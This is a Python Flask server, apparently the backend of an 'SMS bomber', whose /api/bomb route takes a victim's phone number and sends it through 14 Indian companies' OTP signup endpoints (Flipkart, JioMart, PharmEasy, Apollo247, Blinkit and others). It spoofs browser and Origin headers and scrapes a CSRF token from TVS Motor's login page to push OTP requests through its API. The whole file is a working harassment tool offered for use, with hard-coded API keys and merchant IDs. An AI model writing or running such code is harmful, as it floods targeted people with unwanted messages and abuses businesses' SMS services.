from flask import Flask, request, jsonify, send_from_directory
import requests
from bs4 import BeautifulSoup
import json
import os

app = Flask(__name__, static_folder='../')

# --- TVS TOKEN EXTRACTOR ---
def get_tvs_token():
    session = requests.Session()
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    try:
        res = session.get("https://www.tvsmotor.com/account/login", headers=headers, timeout=5)
        soup = BeautifulSoup(res.text, 'html.parser')
        token = soup.find('input', {'name': '__RequestVerificationToken'})['value']
        return token, session.cookies.get_dict()
    except:
        return None, None

@app.route('/')
def index():
    return send_from_directory(app.static_folder, 'index.html')

@app.route('/<path:path>')
def static_files(path):
    return send_from_directory(app.static_folder, path)

@app.route('/api/bomb')
def bomb():
    target = request.args.get('number')
    idx = int(request.args.get('index', 0))
    
    # --- आपकी सभी 14 APIs की पूरी लिस्ट ---
    apis = [
        {
            "name": "Flipkart_v6", 
            "method": "POST", 
            "url": "https://1.rome.api.flipkart.com/api/6/user/signup/status", 
            "json": {"loginId": [f"+91{target}"], "supportAllStates": True},
            "headers": {"X-User-Agent": "Mozilla/5.0 FKUA/website/42/website/Desktop", "Origin": "https://www.flipkart.com"}
        },
        {
            "name": "JioMart", 
            "method": "POST", 
            "url": "https://api.account.relianceretail.com/service/application/retail-auth/v2.0/send-otp", 
            "json": {"mobile": target},
            "headers": {"Origin": "https://account.relianceretail.com"}
        },
        {
            "name": "TVS_Motor", 
            "method": "SPECIAL_TVS"
        },
        {
            "name": "PharmEasy", 
            "method": "POST", 
            "url": "https://pharmeasy.in/api/auth/requestOTP", 
            "json": {"contactNumber": target},
            "headers": {"Origin": "https://pharmeasy.in"}
        },
        {
            "name": "Netmeds", 
            "method": "POST", 
            "url": "https://www.netmeds.com/api/service/application/user/authentication/v1.0/login/otp?platform=65f562c1504a59a67f529ad4", 
            "json": {"mobile": target, "country_code": "91"},
            "headers": {"Origin": "https://www.netmeds.com"}
        },
        {
            "name": "Tata_1mg", 
            "method": "POST", 
            "url": "https://www.1mg.com/pwa-api/auth/create_token", 
            "json": {"number": target, "is_doctor": False, "referral_code": None},
            "headers": {"Origin": "https://www.1mg.com"}
        },
        {
            "name": "SarinSkin", 
            "method": "POST", 
            "url": "https://edge.pickrr.com/aggregator/api/ve1/aggregator-service/user/login", 
            "json": {"cred": target, "tenant_id": "66b5e590984e5c9744f9e56f", "cart_id": "69bfca89b135b6654d6c6a3a", "skip_existing_address_check": False},
            "headers": {"Origin": "https://sarinskin.com"}
        },
        {
            "name": "PlatinumRx", 
            "method": "POST", 
            "url": "https://backend.platinumrx.in/auth/sendOtp", 
            "json": {"phone_number": target},
            "headers": {"Origin": "https://platinumrx.in"}
        },
        {
            "name": "Allen", 
            "method": "POST", 
            "url": "https://api.allen-live.in/api/v1/auth/sendOtp?center_id=&source=home-page-login", 
            "json": {"country_code": "91", "phone_number": target, "persona_type": "STUDENT", "otp_type": "SHARED_DEFAULT"},
            "headers": {"Origin": "https://www.allen.in"}
        },
        {
            "name": "Apollo247", 
            "method": "POST", 
            "url": "https://apigateway.apollo247.in/auth-service/generateOtp", 
            "json": {"loginType": "PATIENT", "mobileNumber": f"+91{target}"}, 
            "headers": {"X-Apollo-Pre-Auth-Key": "eyJHbGciOiJIUzI1NiJ9.ZTVhM2I0YmEtY2E0NC00M2I0LTg0ZTUtZDU3M2M1YjRjZTU3.XyJ9", "platform": "web"}
        },
        {
            "name": "Mamaearth", 
            "method": "POST", 
            "url": "https://gkx.gokwik.co/kp/api/v1/auth/otp/send", 
            "json": {"phone": target, "country": "in", "country_code": "+91"}, 
            "headers": {"Gk-Merchant-Id": "12wyqc26spoknx0kv7t", "Origin": "https://mamaearth.in"}
        },
        {
            "name": "Housing", 
            "method": "POST", 
            "url": "https://login.housing.com/api/v2/send-otp", 
            "json": {"phone": target}
        },
        {
            "name": "ConfirmTkt", 
            "method": "GET", 
            "url": "https://securedapi.confirmtkt.com/api/platform/register", 
            "params": {"newOtp": "true", "mobileNumber": target}
        },
        {
            "name": "Blinkit",
            "method": "POST",
            "url": "https://blinkit.com/v1/user/otp/send",
            "json": {"phone": target},
            "headers": {"app_client": "consumer_web"}
        }
    ]

    api = apis[idx % len(apis)]
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json"
    }
    if "headers" in api: headers.update(api["headers"])

    try:
        # TVS Special Case
        if api.get("method") == "SPECIAL_TVS":
            token, cookies = get_tvs_token()
            if token:
                headers["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
                headers["X-Requested-With"] = "XMLHttpRequest"
                payload = {"MobileNumber": target, "Locale": "V", "__RequestVerificationToken": token}
                res = requests.post("https://www.tvsmotor.com/api/Ecommerce/GetAccountOtp", data=payload, cookies=cookies, headers=headers, timeout=10)
            else: raise Exception("Token Failed")
        
        # Standard POST
        elif api["method"] == "POST":
            res = requests.post(api["url"], json=api["json"], headers=headers, timeout=10)
        
        # Standard GET
        else:
            res = requests.get(api["url"], params=api.get("params"), headers=headers, timeout=10)
            
        if res.status_code in [200, 201, 202]:
            return jsonify({"status": "success", "name": api["name"]})
    except: pass
    
    return jsonify({"status": "failed", "name": api["name"]})

if __name__ == '__main__':
    app.run()
